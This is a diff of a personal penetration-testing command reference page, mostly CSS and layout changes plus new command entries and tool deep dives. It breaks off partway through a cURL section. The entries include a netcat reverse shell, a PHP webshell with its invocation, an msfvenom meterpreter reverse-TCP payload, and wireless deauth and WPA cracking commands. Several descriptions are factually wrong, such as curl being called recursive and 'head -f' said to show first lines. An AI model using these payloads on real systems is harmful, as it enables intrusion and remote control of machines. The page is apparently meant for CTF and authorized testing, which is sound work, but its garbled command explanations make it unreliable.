@@ -5,11 +5,24 @@ page_class: commands
 permalink: /cmd
 ---
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>// pentest.ref — command reference</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root{
-    --panel:#111715;
-    --line:rgba(184, 204, 194, 0.16);
-    --dim:#a5aaa5;
+    --bg:#0a0d12;
+    --panel:#11151d;
+    --panel-2:#161c26;
+    --line:#212836;
+    --text:#e7ebf2;
+    --muted:#7d8798;
+    --dim:#4c5566;
+
     --c-recon:#5ec8d8;
     --c-scan:#5b8def;
     --c-web:#f2a541;
@@ -20,540 +33,161 @@ permalink: /cmd
     --c-misc:#8b95a7;
     --c-tool:#ff8a5c;
   }
-
-  .commands-container {
-    display: grid;
-    grid-template-columns: 260px 1fr;
-    gap: 0;
-    min-height: auto;
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:
+      radial-gradient(1200px 600px at 100% -10%, #131a24 0%, transparent 60%),
+      var(--bg);
+    color:var(--text);
+    font-family:'JetBrains Mono', monospace;
+    -webkit-font-smoothing:antialiased;
   }
+  h1,h2,h3,.display{font-family:'Space Grotesk', sans-serif;}
+
+  /* ===== layout shell ===== */
+  .shell{display:grid;grid-template-columns:260px 1fr;min-height:100vh;}
+  @media (max-width:900px){.shell{grid-template-columns:1fr;}}
 
   /* ===== sidebar ===== */
-  .commands-sidebar {
-    border-right: 1px solid var(--line);
-    background: var(--surface);
-    padding: 22px 16px 40px;
-    position: sticky;
-    top: 80px;
-    max-height: calc(100vh - 100px);
-    overflow-y: auto;
+  .sidebar{
+    border-right:1px solid var(--line);
+    background:var(--panel);
+    position:sticky;top:0;height:100vh;overflow-y:auto;
+    padding:22px 16px 40px;
   }
+  @media (max-width:900px){.sidebar{position:relative;height:auto;border-right:none;border-bottom:1px solid var(--line);}}
+  .brand{display:flex;align-items:baseline;gap:8px;margin-bottom:4px;}
+  .brand .dot{width:8px;height:8px;border-radius:50%;background:var(--c-exploit);box-shadow:0 0 10px var(--c-exploit);flex:none;}
+  .brand h1{font-size:17px;margin:0;letter-spacing:.5px;}
+  .brand-sub{color:var(--muted);font-size:11px;margin:2px 0 20px 16px;letter-spacing:.5px;}
 
-  .brand {
-    display: flex;
-    align-items: baseline;
-    gap: 8px;
-    margin-bottom: 4px;
+  .navgroup-label{color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1.5px;margin:18px 0 8px 2px;}
+  .navlink{
+    display:flex;align-items:center;gap:9px;
+    color:var(--muted);text-decoration:none;font-size:12.5px;
+    padding:6px 8px;border-radius:6px;margin:1px 0;
+    border-left:2px solid transparent;
   }
+  .navlink:hover{color:var(--text);background:var(--panel-2);}
+  .navlink.active{color:var(--text);background:var(--panel-2);border-left-color:var(--c-tool);}
+  .navlink .sw{width:7px;height:7px;border-radius:2px;flex:none;}
 
-  .brand .dot {
-    width: 8px;
-    height: 8px;
-    border-radius: 50%;
-    background: var(--c-exploit);
-    box-shadow: 0 0 10px var(--c-exploit);
-    flex: none;
-  }
+  /* ===== main ===== */
+  main{padding:34px clamp(18px,4vw,54px) 100px;max-width:1180px;}
 
-  .brand h1 {
-    font-size: 17px;
-    margin: 0;
-    letter-spacing: 0.5px;
-    color: var(--text);
-  }
+  .topbar{margin-bottom:34px;}
+  .kicker{color:var(--c-exploit);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin:0 0 10px;}
+  .topbar h2.display{font-size:clamp(26px,4vw,38px);margin:0 0 10px;line-height:1.15;}
+  .topbar p{color:var(--muted);font-size:13px;max-width:640px;line-height:1.6;margin:0 0 22px;}
 
-  .brand-sub {
-    color: var(--dim);
-    font-size: 11px;
-    margin: 2px 0 20px 16px;
-    letter-spacing: 0.5px;
+  .searchwrap{
+    display:flex;align-items:center;gap:10px;
+    background:var(--panel);border:1px solid var(--line);
+    border-radius:8px;padding:11px 14px;
   }
+  .searchwrap .prompt{color:var(--c-exploit);font-weight:700;}
+  .searchwrap input{
+    flex:1;background:transparent;border:none;outline:none;
+    color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13.5px;
+  }
+  .searchwrap input::placeholder{color:var(--dim);}
+  .cursor{width:7px;height:15px;background:var(--c-exploit);animation:blink 1s step-start infinite;}
+  @keyframes blink{50%{opacity:0;}}
+  .stat{color:var(--dim);font-size:11px;white-space:nowrap;}
 
-  .navgroup-label {
-    color: var(--dim);
-    font-size: 10px;
-    text-transform: uppercase;
-    letter-spacing: 1.5px;
-    margin: 18px 0 8px 2px;
-  }
+  section.group{margin-top:52px;scroll-margin-top:20px;}
+  .group-head{display:flex;align-items:center;gap:12px;margin-bottom:6px;}
+  .group-head .idx{color:var(--gc);font-family:'Space Grotesk',sans-serif;font-size:12px;font-weight:700;letter-spacing:1px;}
+  .group-head h3{font-size:18px;margin:0;}
+  .group-desc{color:var(--muted);font-size:12px;margin:0 0 18px;}
+  .group-rule{height:1px;background:linear-gradient(90deg, var(--gc), transparent);margin-bottom:18px;opacity:.5;}
 
-  .navlink {
-    display: flex;
-    align-items: center;
-    gap: 9px;
-    color: var(--muted);
-    text-decoration: none;
-    font-size: 12.5px;
-    padding: 6px 8px;
-    border-radius: 6px;
-    margin: 1px 0;
-    border-left: 2px solid transparent;
-    transition: all 0.2s ease;
-  }
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;}
 
-  .navlink:hover {
-    color: var(--text);
-    background: var(--surface-hover);
+  .card{
+    background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--gc);
+    border-radius:8px;padding:13px 14px;
+    display:flex;flex-direction:column;gap:8px;
   }
+  .card .cmdrow{display:flex;align-items:flex-start;gap:8px;}
+  .card code{
+    font-size:12.5px;color:var(--text);word-break:break-word;line-height:1.5;
+    flex:1;
+  }
+  .card .desc{color:var(--muted);font-size:11.5px;line-height:1.5;}
+  .card .example{
+    font-size:11px;color:var(--dim);background:#0d1119;border:1px dashed var(--line);
+    padding:6px 8px;border-radius:5px;line-height:1.5;word-break:break-word;
+  }
+  .card .example b{color:var(--c-tool);font-weight:600;}
 
-  .navlink.active {
-    color: var(--text);
-    background: var(--surface-hover);
-    border-left-color: var(--accent);
+  .copybtn{
+    flex:none;background:var(--panel-2);border:1px solid var(--line);color:var(--muted);
+    font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.5px;
+    padding:4px 8px;border-radius:5px;cursor:pointer;text-transform:uppercase;
   }
+  .copybtn:hover{color:var(--text);border-color:var(--gc);}
+  .copybtn.copied{color:var(--c-sys);border-color:var(--c-sys);}
 
-  .navlink .sw {
-    width: 7px;
-    height: 7px;
-    border-radius: 2px;
-    flex: none;
-  }
-
-  /* ===== main content ===== */
-  .commands-main {
-    padding: 34px clamp(18px, 4vw, 54px) 100px;
-  }
-
-  .topbar {
-    margin-bottom: 34px;
-  }
-
-  .kicker {
-    color: var(--accent);
-    font-size: 11px;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    margin: 0 0 10px;
-  }
-
-  .topbar h2 {
-    font-size: clamp(26px, 4vw, 38px);
-    margin: 0 0 10px;
-    line-height: 1.15;
-    color: var(--text);
-  }
-
-  .topbar p {
-    color: var(--muted);
-    font-size: 13px;
-    max-width: 640px;
-    line-height: 1.6;
-    margin: 0 0 22px;
-  }
-
-  .searchwrap {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    background: var(--surface);
-    border: 1px solid var(--line);
-    border-radius: 8px;
-    padding: 11px 14px;
-    margin-bottom: 20px;
-  }
-
-  .searchwrap .prompt {
-    color: var(--accent);
-    font-weight: 700;
-  }
-
-  .searchwrap input {
-    flex: 1;
-    background: transparent;
-    border: none;
-    outline: none;
-    color: var(--text);
-    font-family: 'DM Mono', monospace;
-    font-size: 13.5px;
-  }
-
-  .searchwrap input::placeholder {
-    color: var(--dim);
-  }
-
-  .cursor {
-    width: 7px;
-    height: 15px;
-    background: var(--accent);
-    animation: blink 1s step-start infinite;
-  }
-
-  @keyframes blink {
-    50% { opacity: 0; }
-  }
-
-  .stat {
-    color: var(--dim);
-    font-size: 11px;
-    white-space: nowrap;
-  }
-
-  section.group {
-    margin-top: 52px;
-    scroll-margin-top: 100px;
-  }
-
-  .group-head {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    margin-bottom: 6px;
-  }
-
-  .group-head .idx {
-    color: var(--gc);
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 12px;
-    font-weight: 700;
-    letter-spacing: 1px;
-  }
-
-  .group-head h3 {
-    font-size: 18px;
-    margin: 0;
-    color: var(--text);
-  }
-
-  .group-desc {
-    color: var(--muted);
-    font-size: 12px;
-    margin: 0 0 18px;
-  }
-
-  .group-rule {
-    height: 1px;
-    background: linear-gradient(90deg, var(--gc), transparent);
-    margin-bottom: 18px;
-    opacity: 0.5;
-  }
-
-  .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-    gap: 12px;
-  }
-
-  .card {
-    background: var(--surface);
-    border: 1px solid var(--line);
-    border-left: 3px solid var(--gc);
-    border-radius: 8px;
-    padding: 13px 14px;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    transition: all 0.2s ease;
-  }
-
-  .card:hover {
-    border-color: var(--gc);
-    background: var(--surface-hover);
-  }
-
-  .card .cmdrow {
-    display: flex;
-    align-items: flex-start;
-    gap: 8px;
-  }
-
-  .card code {
-    font-size: 12.5px;
-    color: var(--text);
-    word-break: break-word;
-    line-height: 1.5;
-    flex: 1;
-  }
-
-  .card .desc {
-    color: var(--muted);
-    font-size: 11.5px;
-    line-height: 1.5;
-  }
-
-  .card .example {
-    font-size: 11px;
-    color: var(--dim);
-    background: rgba(5, 10, 8, 0.8);
-    border: 1px dashed var(--line);
-    padding: 6px 8px;
-    border-radius: 5px;
-    line-height: 1.5;
-    word-break: break-word;
-  }
-
-  .card .example b {
-    color: var(--c-tool);
-    font-weight: 600;
-  }
-
-  .copybtn {
-    flex: none;
-    background: var(--surface-hover);
-    border: 1px solid var(--line);
-    color: var(--muted);
-    font-family: 'DM Mono', monospace;
-    font-size: 10px;
-    letter-spacing: 0.5px;
-    padding: 4px 8px;
-    border-radius: 5px;
-    cursor: pointer;
-    text-transform: uppercase;
-    transition: all 0.2s ease;
-  }
-
-  .copybtn:hover {
-    color: var(--text);
-    border-color: var(--gc);
-  }
-
-  .copybtn.copied {
-    color: var(--c-sys);
-    border-color: var(--c-sys);
-  }
+  footer{border-top:1px solid var(--line);margin-top:70px;padding-top:22px;color:var(--dim);font-size:11px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;}
+  .hidden{display:none !important;}
+  .no-results{color:var(--dim);font-size:13px;padding:30px 0;text-align:center;display:none;}
 
   /* ===== add-command controls ===== */
-  .addbar {
-    display: flex;
-    gap: 8px;
-    margin-bottom: 20px;
-    flex-wrap: wrap;
+  .addbar{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;}
+  .addbtn{
+    font-family:'JetBrains Mono',monospace;font-size:11.5px;letter-spacing:.3px;
+    padding:9px 14px;border-radius:7px;cursor:pointer;text-transform:uppercase;
   }
+  .addbtn.primary{background:var(--c-exploit);border:none;color:#0a0d12;font-weight:700;}
+  .addbtn.ghost{background:var(--panel);border:1px solid var(--line);color:var(--muted);}
+  .addbtn.ghost:hover{color:var(--text);border-color:var(--dim);}
 
-  .addbtn {
-    font-family: 'DM Mono', monospace;
-    font-size: 11.5px;
-    letter-spacing: 0.3px;
-    padding: 9px 14px;
-    border-radius: 7px;
-    cursor: pointer;
-    text-transform: uppercase;
-    border: none;
-    transition: all 0.2s ease;
+  .modal-backdrop{
+    position:fixed;inset:0;background:rgba(6,8,12,.72);backdrop-filter:blur(2px);
+    display:none;align-items:center;justify-content:center;z-index:50;padding:20px;
   }
-
-  .addbtn.primary {
-    background: var(--accent);
-    color: #05130e;
-    font-weight: 700;
+  .modal-backdrop.open{display:flex;}
+  .modal{
+    background:var(--panel);border:1px solid var(--line);border-radius:12px;
+    width:100%;max-width:480px;padding:22px;
   }
-
-  .addbtn.primary:hover {
-    background: #46ebb1;
+  .modal h4{margin:0 0 4px;font-size:16px;}
+  .modal .modal-sub{color:var(--muted);font-size:11.5px;margin:0 0 18px;}
+  .field{margin-bottom:12px;}
+  .field label{display:block;color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px;}
+  .field input, .field select, .field textarea{
+    width:100%;background:var(--panel-2);border:1px solid var(--line);color:var(--text);
+    font-family:'JetBrains Mono',monospace;font-size:12.5px;padding:9px 10px;border-radius:6px;outline:none;
   }
+  .field input:focus, .field select:focus, .field textarea:focus{border-color:var(--c-exploit);}
+  .field textarea{resize:vertical;min-height:44px;}
+  .modal-actions{display:flex;justify-content:flex-end;gap:8px;margin-top:18px;}
 
-  .addbtn.ghost {
-    background: var(--surface);
-    border: 1px solid var(--line);
-    color: var(--muted);
+  .yours-badge{
+    font-size:9.5px;letter-spacing:.5px;text-transform:uppercase;color:var(--c-exploit);
+    border:1px solid var(--c-exploit);border-radius:4px;padding:1px 6px;flex:none;
   }
-
-  .addbtn.ghost:hover {
-    color: var(--text);
-    border-color: var(--dim);
+  .delbtn{
+    flex:none;background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:14px;line-height:1;padding:2px 4px;
   }
-
-  .modal-backdrop {
-    position: fixed;
-    inset: 0;
-    background: rgba(6, 8, 12, 0.72);
-    backdrop-filter: blur(2px);
-    display: none;
-    align-items: center;
-    justify-content: center;
-    z-index: 50;
-    padding: 20px;
-  }
-
-  .modal-backdrop.open {
-    display: flex;
-  }
-
-  .modal {
-    background: var(--surface);
-    border: 1px solid var(--line);
-    border-radius: 12px;
-    width: 100%;
-    max-width: 480px;
-    padding: 22px;
-  }
-
-  .modal h4 {
-    margin: 0 0 4px;
-    font-size: 16px;
-    color: var(--text);
-  }
-
-  .modal .modal-sub {
-    color: var(--muted);
-    font-size: 11.5px;
-    margin: 0 0 18px;
-  }
-
-  .field {
-    margin-bottom: 12px;
-  }
-
-  .field label {
-    display: block;
-    color: var(--dim);
-    font-size: 10.5px;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    margin-bottom: 5px;
-  }
-
-  .field input,
-  .field select,
-  .field textarea {
-    width: 100%;
-    background: var(--surface-hover);
-    border: 1px solid var(--line);
-    color: var(--text);
-    font-family: 'DM Mono', monospace;
-    font-size: 12.5px;
-    padding: 9px 10px;
-    border-radius: 6px;
-    outline: none;
-  }
-
-  .field input:focus,
-  .field select:focus,
-  .field textarea:focus {
-    border-color: var(--accent);
-  }
-
-  .field textarea {
-    resize: vertical;
-    min-height: 44px;
-  }
-
-  .modal-actions {
-    display: flex;
-    justify-content: flex-end;
-    gap: 8px;
-    margin-top: 18px;
-  }
-
-  .yours-badge {
-    font-size: 9.5px;
-    letter-spacing: 0.5px;
-    text-transform: uppercase;
-    color: var(--accent);
-    border: 1px solid var(--accent);
-    border-radius: 4px;
-    padding: 1px 6px;
-    flex: none;
-  }
-
-  .delbtn {
-    flex: none;
-    background: transparent;
-    border: none;
-    color: var(--dim);
-    cursor: pointer;
-    font-size: 14px;
-    line-height: 1;
-    padding: 2px 4px;
-  }
-
-  .delbtn:hover {
-    color: var(--c-exploit);
-  }
-
-  .hidden {
-    display: none !important;
-  }
-
-  .no-results {
-    color: var(--dim);
-    font-size: 13px;
-    padding: 30px 0;
-    text-align: center;
-    display: none;
-  }
-
-  .commands-footer {
-    border-top: 1px solid var(--line);
-    margin-top: 70px;
-    padding-top: 22px;
-    color: var(--dim);
-    font-size: 11px;
-    display: flex;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 8px;
-  }
-
-  @media (max-width: 900px) {
-    .commands-container {
-      grid-template-columns: 1fr;
-    }
-
-    .commands-sidebar {
-      border-right: none;
-      border-bottom: 1px solid var(--line);
-      position: relative;
-      top: 0;
-      max-height: auto;
-    }
-
-    .commands-main {
-      padding: 24px clamp(16px, 4vw, 40px) 60px;
-    }
-
-    .grid {
-      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-    }
-  }
-
-  @media (max-width: 640px) {
-    .commands-main {
-      padding: 20px 16px 50px;
-    }
-
-    .topbar h2 {
-      font-size: 24px;
-    }
-
-    .topbar p {
-      font-size: 12px;
-      margin-bottom: 16px;
-    }
-
-    .searchwrap {
-      padding: 8px 10px;
-    }
-
-    .grid {
-      grid-template-columns: 1fr;
-      gap: 10px;
-    }
-
-    .card {
-      padding: 10px 12px;
-    }
-
-    .addbar {
-      flex-direction: column;
-    }
-
-    .addbtn {
-      width: 100%;
-    }
-  }
+  .delbtn:hover{color:var(--c-exploit);}
 </style>
-
-<div class="commands-container">
-  <aside class="commands-sidebar" id="sidebar">
+</head>
+<body>
+<div class="shell">
+  <aside class="sidebar" id="sidebar">
     <div class="brand"><span class="dot"></span><h1>pentest.ref</h1></div>
     <div class="brand-sub">command reference // v1</div>
     <div id="navlist"></div>
   </aside>
 
-  <main class="commands-main">
+  <main>
     <div class="topbar">
       <p class="kicker">personal reference — learn · practice · exploit ethically</p>
-      <h2>Penetration Testing<br>Command Reference</h2>
+      <h2 class="display">Penetration Testing<br>Command Reference</h2>
       <p>Every command below is grouped by tool or phase of engagement, with a one-line explanation and, for the deep-dive tools, a worked example. Type below to filter across all sections.</p>
       <div class="searchwrap">
         <span class="prompt">$</span>
@@ -571,7 +205,7 @@ permalink: /cmd
     <div id="content"></div>
     <p class="no-results" id="noresults">no commands match that filter.</p>
 
-    <footer class="commands-footer">
+    <footer>
       <span>built for CTF &amp; authorized engagements only — always get written scope before you run anything above.</span>
       <span id="totalcount"></span>
     </footer>
@@ -695,7 +329,7 @@ const DATA = [
     ["nc -lvnp <port>","Netcat listener"],
     ["nc <ip> <port>","Netcat connect"],
     ["busybox nc -e /bin/sh <ip> <port>","Reverse shell via busybox nc when standard nc lacks -e"],
-    ["&lt;?php system($_GET[\"cmd\"]); ?&gt;","Minimal PHP webshell — drop on a target with file upload/write access"],
+    ["&lt;?php system($_GET[\"cmd\"]); ?&gt;","Minimal PHP webshell — drop on a target with file upload/write access, then call ?cmd=id"],
     ["openssl s_client -connect <ip>:<port>","SSL connection test"]
   ]},
 
@@ -710,7 +344,7 @@ const DATA = [
     ["cat /etc/passwd","List system users"],
     ["ps aux","Running processes"],
     ["find / -perm 2000 -o -perm 4000 2&gt;/dev/null","SUID/SGID find variant"],
-    ["find / -perm -u=s -type f 2&gt;/dev/null","Find SUID binaries (symbolic syntax)"],
+    ["find / -perm -u=s -type f 2&gt;/dev/null","Find SUID binaries (symbolic permission syntax)"],
     ["cat /etc/crontab","Cron jobs"],
     ["env","Environment variables"],
     ["history","Command history"]
@@ -739,6 +373,18 @@ const DATA = [
     ["sha256sum &lt;file&gt;","SHA256 hash"]
   ]},
 
+{ id:"reporting", title:"Reporting", color:"--c-misc", desc:"Documenting findings for the client / write-up.",
+  cmds:[
+    ["dradis","Reporting framework"],
+    ["maltego","Data visualization for reports"],
+    ["faraday","Pen test IDE / collaboration"],
+    ["cutycapt --url &lt;url&gt; --out screenshot.png","Web screenshot capture"],
+    ["leafpad report.txt","Create report notes"],
+    ["pandoc report.md -o report.pdf","Convert markdown to PDF"],
+    ["recordmydesktop","Screen recording for PoC"],
+    ["obs","Advanced screen recording"]
+  ]},
+
 { id:"system", title:"System &amp; Basic Commands", color:"--c-sys", desc:"Everyday Linux commands used constantly during an engagement.",
   cmds:[
     ["ls -la","List directory contents, incl. hidden"],
@@ -754,6 +400,43 @@ const DATA = [
     ["clear","Clear terminal"]
   ]},
 
+{ id:"linux-fs", title:"Linux — Files &amp; Navigation", color:"--c-sys", desc:"Filesystem navigation and manipulation.",
+  cmds:[
+    ["ls -la","List all files, long format"],
+    ["cd ~","Go to home directory"],
+    ["cd ..","Go up one directory"],
+    ["pwd","Print working directory"],
+    ["mkdir test","Create directory"],
+    ["rm -r test","Remove directory recursively"],
+    ["cp a.txt b.txt","Copy a.txt to b.txt"],
+    ["mv old new","Move / rename file"],
+    ["touch notes.txt","Create empty file"],
+    ["less file","Page through file"],
+    ["tail -f log","Follow log live"],
+    ["head -f log","Show first lines of file"],
+    ["find / -name '*.txt'","Search database of files"],
+    ["locate passwd","Search the locate database"],
+    ["strings binary","Print printable strings"],
+    ["file report.pdf","Determine file type"]
+  ]},
+
+{ id:"linux-sys", title:"Linux — System Info &amp; Monitoring", color:"--c-sys", desc:"Understand the box you're standing on.",
+  cmds:[
+    ["date","Show current date/time"],
+    ["uptime","Show current uptime"],
+    ["whoami","Current logged in user"],
+    ["cat /proc/cpuinfo","CPU info"],
+    ["cat /proc/meminfo","Memory info"],
+    ["free -h","Memory and swap usage"],
+    ["df -h","Disk usage (human readable)"],
+    ["du -sh &lt;dir&gt;","Size of a directory"],
+    ["uname -a","Kernel / system info"],
+    ["hostname","System hostname"],
+    ["who","Who is logged in"],
+    ["env","Show environment variables"],
+    ["echo $PATH","Show PATH variable"]
+  ]},
+
 { id:"linux-net", title:"Linux — Networking", color:"--c-sys", desc:"Local networking commands used constantly on target boxes.",
   cmds:[
     ["ping host","Ping a host"],
@@ -761,7 +444,7 @@ const DATA = [
     ["dig -x 8.8.8.8","Reverse DNS lookup"],
     ["wget url","Download a file"],
     ["wget -c url","Resume interrupted download"],
-    ["curl url","Fetch data from a URL"],
+    ["curl url","Recursively fetch data from a URL"],
     ["curl -O url","Save file with original name"],
     ["curl -i url","Show HTTP headers with response"],
     ["curl -L url","Follow redirects"],
@@ -770,6 +453,114 @@ const DATA = [
     ["ssh -D 8080 user@host","SOCKS proxy tunnel"],
     ["ip addr / ifconfig","Show IP address info"],
     ["ss -tuln","Show listening ports"]
+  ]},
+
+{ id:"linux-perm", title:"Linux — Permissions", color:"--c-sys", desc:"chmod/chown fundamentals for privesc and cleanup.",
+  cmds:[
+    ["chmod octal file","Change file permissions"],
+    ["chmod 777 file","rwx rwx rwx (everyone full access)"],
+    ["chmod 755 file","rwx r-x r-x (owner full, others read/execute)"],
+    ["chmod 644 file","rw- r-- r-- (owner read/write, others read)"],
+    ["chown user file","Change file owner"],
+    ["chgrp group file","Change file group"],
+    ["4 = read (r), 2 = write (w), 1 = execute (x)","Permission bit reference"]
+  ]},
+
+{ id:"linux-cron", title:"Linux — Scheduling (cron)", color:"--c-sys", desc:"Persistence and job scheduling — frequently a privesc vector.",
+  cmds:[
+    ["crontab -e","Edit cron jobs for current user"],
+    ["crontab -l","List cron jobs"],
+    ["* * * * * /path/to/script.sh","Cron syntax — min hr day month weekday"],
+    ["man crontab","Cron scheduling manual"]
+  ]},
+
+{ id:"pkg", title:"Package Management", color:"--c-misc", desc:"Installing tooling on Debian/Ubuntu-based systems.",
+  cmds:[
+    ["apt update","Update package list"],
+    ["apt upgrade","Upgrade installed packages"],
+    ["apt install &lt;pkg&gt;","Install package"],
+    ["apt remove &lt;pkg&gt;","Remove package"],
+    ["dpkg -i &lt;pkg.deb&gt;","Install a .deb package"],
+    ["dpkg -r &lt;pkg&gt;","Remove a package"],
+    ["dpkg -l","List installed packages"]
+  ]},
+
+{ id:"maint", title:"Maintenance &amp; Wireless", color:"--c-misc", desc:"Housekeeping plus wireless attack basics.",
+  cmds:[
+    ["sudo apt update","Update package list"],
+    ["sudo apt upgrade","Upgrade packages"],
+    ["sudo apt install &lt;tool&gt;","Install a tool"],
+    ["sudo apt remove &lt;tool&gt;","Remove a tool"],
+    ["df -h","Disk usage"],
+    ["du -sh /","Directory usage"],
+    ["free -h","Memory usage"],
+    ["journalctl -xe","System logs"],
+    ["reboot / shutdown -h now","Restart / shutdown system"],
+    ["iwconfig","Wireless interfaces"],
+    ["iwlist wlan0 scan","Scan networks"],
+    ["airmon-ng start wlan0","Monitor mode"],
+    ["aireplay-ng --deauth 0 -a &lt;BSSID&gt; wlan0","Deauth attack"],
+    ["aircrack-ng capture.cap -w wordlist.txt","Crack WPA/WPA2 handshake"]
+  ]},
+
+{ id:"social", title:"Social Engineering &amp; Files", color:"--c-misc", desc:"Human-layer tooling and the file locations you'll reference constantly.",
+  cmds:[
+    ["setoolkit","Social Engineering Toolkit"],
+    ["gophish","Phishing framework"],
+    ["beef-xss","Browser exploitation framework"],
+    ["msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o payload.exe","Create payload"],
+    ["/etc/passwd","User accounts"],
+    ["/etc/shadow","Password hashes"],
+    ["/etc/hosts","Host entries"],
+    ["/etc/crontab","Cron jobs"],
+    ["/var/log/","Log files"],
+    ["~/.bash_history","Command history"],
+    ["/root/","Root directory"],
+    ["man &lt;command&gt;","Manual pages"],
+    ["&lt;command&gt; --help","Command help"],
+    ["kali-docs / kali-tools","Kali documentation and tool listing"]
+  ]},
+
+{ id:"tool-nmap", title:"Nmap — Deep Dive", color:"--c-tool", tool:true, desc:"Network mapper: host discovery, port scanning, service/version detection, and NSE scripting.",
+  cmds:[
+    ["nmap -sV -sC -p- <ip>","Full TCP port scan with default scripts and version detection","nmap -sV -sC -p- 10.10.11.23 — a solid first full scan on a CTF box"],
+    ["nmap -sn 192.168.1.0/24","Host discovery / ping sweep across a subnet","nmap -sn 192.168.1.0/24 — find live hosts before scanning individually"],
+    ["nmap -sU -p 53,161,500 <ip>","Scan common UDP ports","nmap -sU -p 53,161,500 10.10.11.23 — check DNS/SNMP/IKE over UDP"],
+    ["nmap -A -T4 <ip>","Aggressive scan: OS detection, version, scripts, traceroute","nmap -A -T4 10.10.11.23 — quick aggressive recon in one pass"],
+    ["nmap --script vuln <ip>","Run the NSE 'vuln' script category","nmap --script vuln 10.10.11.23 — surface known CVEs on open services"],
+    ["nmap -p 445 --script smb-vuln* <ip>","Check SMB port for known SMB vulnerabilities","nmap -p 445 --script smb-vuln* 10.10.11.23 — check for EternalBlue etc."],
+    ["nmap -sC -sV -oN scan.txt <ip>","Save scan results to a file for later reference","nmap -sC -sV -oN nmap-initial.txt 10.10.11.23"],
+    ["nmap -p- --min-rate 5000 <ip>","Fast full port scan at a high packet rate","nmap -p- --min-rate 5000 -oG allports.txt 10.10.11.23"],
+    ["nmap --script http-title -p 80,443 <ip>","Grab page titles from web ports","nmap --script http-title -p 80,443 10.10.11.23"],
+    ["nmap -sV --version-intensity 9 <ip>","Deep, thorough version detection","nmap -sV --version-intensity 9 -p 22,80 10.10.11.23"]
+  ]},
+
+{ id:"tool-gobuster", title:"Gobuster — Deep Dive", color:"--c-tool", tool:true, desc:"Fast directory, DNS, and vhost brute-forcer written in Go.",
+  cmds:[
+    ["gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt","Directory / file brute force","gobuster dir -u http://target.htb -w /usr/share/wordlists/dirb/common.txt"],
+    ["gobuster dir -u http://<target> -w wordlist.txt -x php,html,txt","Brute force appending common extensions","gobuster dir -u http://target.htb -w big.txt -x php,txt,bak"],
+    ["gobuster dns -d <domain> -w subdomains.txt","Subdomain enumeration via DNS brute force","gobuster dns -d target.htb -w subdomains-top1million.txt"],
+    ["gobuster vhost -u http://<target> -w vhosts.txt","Virtual host enumeration","gobuster vhost -u http://target.htb -w vhosts.txt --append-domain"],
+    ["gobuster dir -u http://<target> -w wordlist.txt -s 200,301,302","Only show specific status codes","gobuster dir -u http://target.htb -w common.txt -s 200,301,302,403"],
+    ["gobuster dir -u http://<target> -w wordlist.txt -t 50","Raise thread count for speed","gobuster dir -u http://target.htb -w common.txt -t 50"],
+    ["gobuster dir -u https://<target> -w wordlist.txt -k","Skip TLS certificate verification (self-signed certs)","gobuster dir -u https://target.htb -w common.txt -k"],
+    ["gobuster fuzz -u http://<target>/FUZZ -w wordlist.txt","Generic FUZZ-keyword based fuzzing mode","gobuster fuzz -u http://target.htb/FUZZ -w common.txt"]
+  ]},
+
+{ id:"curl", title:"cURL — REST &amp; API Testing", color:"--c-web", desc:"Sending and manipulating HTTP/REST requests by hand — essential for API testing and confirming what a browser or Burp shows.",
+  cmds:[
+    ["curl -X GET <url>","Send a GET request explicitly","curl -X GET https://target.htb/api/users"],
+    ["curl -X POST <url> -d 'key=value'","Send a POST request with form-encoded body data","curl -X POST https://target.htb/api/login -d 'user=admin&pass=test'"],
+    ["curl -X POST <url> -H \"Content-Type: application/json\" -d '{\"key\":\"value\"}'","Send a POST request with a raw JSON body","curl -X POST https://target.htb/api/users -H \"Content-Type: application/json\" -d '{\"username\":\"admin\"}'"],
+    ["curl -X PUT <url> -d '{...}'","Send a PUT request to update/replace a resource","curl -X PUT https://target.htb/api/users/1 -H \"Content-Type: application/json\" -d '{\"role\":\"admin\"}'"],
+    ["curl -X DELETE <url>","Send a DELETE request against a resource","curl -X DELETE https://target.htb/api/users/1"],
+    ["curl -i <url>","Show response headers along with the body","curl -i https://target.htb/api/status"],
+    ["curl -s -o out.json <url>","Silent mode, save response body to a file","curl -s -o resp.json https://target.htb/api/data"],
+    ["curl -u user:pass <url>","Authenticate using HTTP Basic Auth","curl -u admin:password123 https://target.htb/admin"],
+    ["curl -H \"Authorization: Bearer <token>\" <url>","Send a request with a bearer/JWT token, e.g. to test authz on protected endpoints","curl -H \"Authorization: Bearer eyJhbGciOi...\" https://target.htb/api/protected"],
+    ["curl --cookie \"name=value\" <url>","Send a request with a specific cookie, useful for session/IDOR testing","curl --cookie \"session=abc123\" https://target.htb/dashboard"],
+    ["curl -k <url>","Skip TLS certificate verification (self-signed certs on internal boxes)","curl -k https://10.10.11.23/api/health"],
